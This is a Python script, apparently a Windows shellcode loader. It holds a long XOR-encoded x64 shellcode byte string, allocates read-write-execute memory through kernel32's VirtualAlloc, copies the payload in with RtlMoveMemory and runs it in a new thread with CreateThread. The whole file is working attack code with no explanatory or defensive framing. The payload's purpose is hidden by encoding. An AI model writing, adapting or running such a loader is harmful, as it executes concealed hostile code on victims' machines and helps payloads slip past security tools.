import ctypes
import sys
from ctypes import *

buf=b"\x48\x31\xc9\x48\x81\xe9\xb1\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xf8\x3d\x59\x54\x46\x6d\x59\x99\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x75\xda\xb0\xb6\x85\x95\x99\xf8\x3d\x18\x05\x07\x3d\x0b\xc8\xae\x75\x68\x86\x23\x25\xd2\xcb\x98\x75\xd2\x06\x5e\x25\xd2\xcb\xd8\x75\xd2\x26\x16\x25\x56\x2e\xb2\x77\x14\x65\x8f\x25\x68\x59\x54\x01\x38\x28\x44\x41\x79\xd8\x39\xf4\x54\x15\x47\xac\xbb\x74\xaa\x7c\x08\x1c\xcd\x3f\x79\x12\xba\x01\x11\x55\x96\x0b\xd8\xe1\xe0\x36\x5b\x5b\xc3\x1f\x59\x99\xf8\xb6\xd9\xdc\x46\x6d\x59\xd1\x7d\xfd\x2d\x33\x0e\x6c\x89\xc9\x73\x75\x41\x10\xcd\x2d\x79\xd0\xf9\xed\xba\x02\x0e\x92\x90\xd8\x73\x09\xd1\x1c\x47\xbb\x14\xa8\x31\x75\x68\x94\xea\x2c\x98\x50\xf5\x7c\x58\x95\x7e\x8d\x2c\x68\xb4\x3e\x15\x70\x4e\x28\x60\x48\x8d\xe5\x01\x10\xcd\x2d\x7d\xd0\xf9\xed\x3f\x15\xcd\x61\x11\xdd\x73\x7d\x45\x1d\x47\xbd\x18\x12\xfc\xb5\x11\x55\x96\x2c\x01\xd8\xa0\x63\x00\x0e\x07\x35\x18\xc0\xb9\x67\x11\xd7\xaa\x4d\x18\xcb\x07\xdd\x01\x15\x1f\x37\x11\x12\xea\xd4\x12\xab\xb9\x92\x04\xd0\x46\x4a\x2a\x66\x19\x5e\x6b\x99\xf8\x7c\x0f\x1d\xcf\x8b\x11\x18\x14\x9d\x58\x54\x46\x24\xd0\x7c\xb0\x0c\x99\x04\x16\x24\xe5\x9b\xf8\x1d\xa9\x54\x46\x6d\x59\xd8\xac\x74\xd0\xb0\x0a\xe4\xa8\xd8\x42\x71\x2e\x72\x41\x92\x8c\xd5\x71\xd7\x31\x55\x47\x6d\x59\xc0\xb9\x87\x70\xd4\x2d\x6d\xa6\x4c\x92\x3f\x00\x04\x16\x20\x68\x50\xb5\x0c\x99\x1c\xb9\xad\x11\x10\x3a\x7c\xe3\xbe\x49\xb2\xb9\x66\x2d\x75\xd0\x93\x2c\x7d\x18\xc1\xb4\xb4\xbb\x1c\xcf\x94\x18\x23\x3a\xe6\x6e\x33\xb9\xb8\x11\xa8\x2a\x75\xd0\xad\x07\xd7\xee\x70\xc0\xc2\xa6\x81\x0b\x5c\x99\xd1\xc9\xef\x11\xdd\xbf\x2c\xe3\xed\x14\x06\xb8\xab\x93\x25\xd0\x60\xb0\xb4\x9e\x15\xfc\x18\x37\xd4\x99\xc2\x8c\x1c\xc7\xa9\xe9\x9b\xf8\x3d\x11\xd7\xaa\x7d\x11\x10\x1a\x70\x68\x9d\x2c\x69\x18\xc1\xb0\xb4\xa0\x15\xfc\x6f\x80\x51\xa7\xc2\x8c\x1c\xc5\xa9\x79\xc7\x71\xcb\xd8\xa2\x74\xd6\x41\x2f\xb4\xb0\xc7\x54\x47\x6d\x59\xf3\xb8\x7c\x00\x3c\x46\x7d\x59\x99\xb9\x65\x11\xdd\xb4\x25\x68\x50\xb9\x87\x01\xf0\x15\x88\xa6\x4c\xb0\xb0\xc1\x54\x47\x6d\x59\xd0\x71\xe2\x0a\x02\x16\x20\x68\x50\xb1\xb4\xa9\x1c\xcf\xb7\x11\x10\x01\x7c\xe3\x56\x9f\xa5\x06\x66\x2d\x75\xda\x90\x66\x25\x58\x5a\xb0\x14\x9f\x21\xa6\x24\xd0\x67\xa7\x64\x18\x0d\x07\x3b\xb1\x89\xf8\x3d\x59\x79\x16\xf6\x59\xa1\xb0\xe2\xd3\xf9\xc5\xba\x57\x09\x5d\xf3\xde\x0a\x0e\x5c\x99\xd0\x71\xc5\xf3\xaa\x86\x18\xa2\xd1\xc9\xe6\x18\x56\x5a\x6d\x11\x10\x3a\xbd\xbb\x5b\x44\x71\x4f\xd8\x72\x29\x59\x15\xc0\x79\x41\xd8\x70\x29\x59\xaa\x86\x18\xba\xd1\xc9\xe6\xa7\x94\x07\x6f\x45\x99\xb9\xb7\x4d\x54\x07\xeb\x4d\x81\xb9\xb5\x4d\x54\x07\x6f\x4d\x81\xb9\xb7\x4d\x44\x07\x5d\x48\xd0\x07\xfc\x11\xab\x8f\x18\x82\xc6\xb9\xc2\xbe\x0c\x2c\x6d\x00\xd0\x3f\xff\xa9\xe1\xe4\x3b\xa6\x4c"

#PAGE_EXECUTE_READWRITEVIRTUAL_MEM
PAGE_EXECUTE_READWRITE  =  0x00000040 #
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 ) #
buf_arr = bytearray (buf) #shellcode
buf_size = len(buf_arr) #shellcode
kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll") #kernel32.dll
kernel32.VirtualAlloc.restype = ctypes.c_uint64 #c_uint64
sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #
buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #shellcode
#print(sc_ptr)
#print(buf_ptr)
kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #dllshellcode

handle = kernel32.CreateThread(ctypes.c_int(0),
                               ctypes.c_int(0),
                               ctypes.c_uint64(sc_ptr),
                               ctypes.c_int(0),
                               ctypes.c_int(0),
                               ctypes.pointer(ctypes.c_int(0)))
kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
